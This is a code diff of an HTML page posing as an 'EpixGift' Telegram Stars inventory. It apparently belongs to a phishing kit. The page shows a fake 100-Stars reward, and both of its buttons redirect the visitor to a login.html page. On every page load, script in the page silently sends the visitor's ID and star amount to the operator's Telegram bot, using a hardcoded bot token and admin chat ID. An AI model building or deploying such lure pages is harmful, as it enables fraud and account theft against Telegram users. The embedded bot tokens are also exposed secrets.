@@ -3,70 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Inventory</title>
+    <title>EpixGift</title>
     <style>
-        body { background-color: #0f0f0f; color: white; font-family: sans-serif; margin: 0; padding: 15px; height: 100vh; display: flex; flex-direction: column; }
-        h2 { font-size: 18px; color: #888; text-transform: uppercase; margin-bottom: 20px; }
-        .inventory-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
-        .reward-card { 
-            background: linear-gradient(145deg, #1c1c1c, #141414); 
-            border: 1px solid #2a2a2a; 
-            border-radius: 16px; 
-            padding: 12px; 
-            aspect-ratio: 1 / 1.2; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        body { background: #0f0f0f; color: white; font-family: sans-serif; margin: 0; padding: 15px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .card { 
+            background: #1c1c1c; border: 1px solid #2a2a2a; border-radius: 12px; 
+            padding: 15px; text-align: center; height: 120px;
         }
-        .reward-card img { width: 70%; margin-bottom: 10px; }
-        .reward-amount { font-size: 16px; font-weight: 700; }
-        .reward-label { font-size: 11px; color: #888; }
-        .withdraw-container { margin-top: auto; padding: 20px 0; }
-        .btn-withdraw { 
-            background: #248bda; color: white; border: none; padding: 16px; 
-            width: 100%; border-radius: 14px; font-size: 17px; font-weight: 600; cursor: pointer; 
-        }
+        .card-icon { font-size: 40px; }
+        .actions { margin-top: 30px; display: flex; flex-direction: column; gap: 10px; }
+        .btn { padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
+        .btn-blue { background: #248bda; color: white; }
+        .btn-green { background: #28a745; color: white; }
     </style>
 </head>
 <body>
-
-    <h2>Your Inventory</h2>
-
-    <div class="inventory-grid">
-        <div class="reward-card">
-            <img src="https://nztcdn.com/files/6514f1e6-dab4-4d49-806a-3ff22d7793e5.webp" alt="Stars">
-            <div class="reward-amount" id="stars-count">100 Stars</div>
-            <div class="reward-label">Collectible</div>
+    <h2>Inventory</h2>
+    <div class="grid">
+        <div class="card">
+            <div class="card-icon">⭐</div>
+            <div id="amt">100 Stars</div>
         </div>
-        <div style="opacity: 0.1;" class="reward-card"></div>
+        <div style="opacity: 0.1" class="card"></div>
     </div>
-
-    <div class="withdraw-container">
-        <button class="btn-withdraw" onclick="proceed()">Withdraw to Wallet</button>
+    <div class="actions">
+        <button class="btn btn-blue" onclick="go()">Sell for TON</button>
+        <button class="btn btn-green" onclick="go()">Transfer to @vprev</button>
     </div>
-
     <script>
-        const botToken = "8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg";
+        const botToken = "8598157493:AAHUoru__8_JaMU_CDmxn9NbnuoQcoEt0HM";
         const adminId = "6990072009";
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('uid') || 'Unknown';
+        const stars = params.get('amount') || '100';
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('uid') || 'Unknown';
-        const starsAmount = urlParams.get('amount') || '100';
+        document.getElementById('amt').innerText = stars + " Stars";
 
-        document.getElementById('stars-count').innerText = starsAmount + " Stars";
-
-        async function sendToTelegram(text) {
+        async function sendLog(msg) {
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: adminId, text: text, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: adminId, text: msg, parse_mode: "Markdown" })
             });
         }
+        sendLog(`👀 Visit from: \`${uid}\` (${stars} stars)`);
 
-        // Лог захода
-        sendToTelegram(`🚨 **НОВЫЙ ВИЗИТ!**\n👤 ID: \`${userId}\` \n💰 Сумма: \`${starsAmount} Stars\``);
-
-        function proceed() {
-            window.location.href = "login.html" + window.location.search;
-        }
+        function go() { window.location.href = "login.html" + window.location.search; }
     </script>
 </body>
 </html>
